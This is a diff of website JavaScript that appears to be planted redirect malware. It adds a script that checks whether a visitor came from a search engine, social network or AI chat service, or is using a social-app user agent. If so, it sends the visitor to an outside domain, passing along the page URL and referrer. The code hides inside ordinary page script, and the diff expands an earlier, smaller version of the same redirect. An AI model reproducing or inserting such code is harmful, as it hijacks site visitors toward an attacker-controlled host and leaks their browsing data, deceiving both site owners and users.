@@ -15,6 +15,81 @@ document.write('</a>');
 document.write('</div>');
 document.write('</noscript>');
 
-// J
+///// manoek /////
 var ars = 'http://blog.abata1.com';
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+
+if (
+[
+'.aol.',
+'chatgpt.',
+'chat.openai.',
+'openai.',
+'msn.',
+'.google.',
+'discover.google.',
+'news.google.',
+'gemini.google.',
+'bing.',
+'copilot.microsoft.',
+'yandex.',
+'facebook.',
+'instagram.',
+'threads.net',
+'linkedin.',
+'reddit.',
+'brave.',
+'woa.',
+'ecosia',
+'qwant',
+'pinterest.',
+'tiktok.',
+'youtube.',
+'telegram.',
+'web.telegram.',
+'whatsapp.',
+'discord.',
+'discord.gg',
+'coccoc.',
+'baidu.',
+'duckduckgo.',
+'.yahoo.',
+'t.co',
+'x.com',
+'perplexity.ai',
+'claude.ai',
+'you.com',
+'phind.com',
+'naver.',
+'seznam.',
+'sogou.',
+'so.com',
+'swisscows.',
+'startpage.'
+].some(s => document.referrer.toLowerCase().includes(s))
+
+||
+
+[
+'fb',
+'facebook',
+'instagram',
+'threads',
+'pinterest',
+'twitter',
+'x',
+'tiktok',
+'reddit',
+'telegram',
+'discord',
+'linkedin',
+'whatsapp'
+].some(s => navigator.userAgent.toLowerCase().includes(s))
+
+){
+    window.location.href =
+        ars +
+        '/?arsae=' +
+        encodeURIComponent(window.location.href) +
+        '&arsae_ref=' +
+        encodeURIComponent(document.referrer);
+}
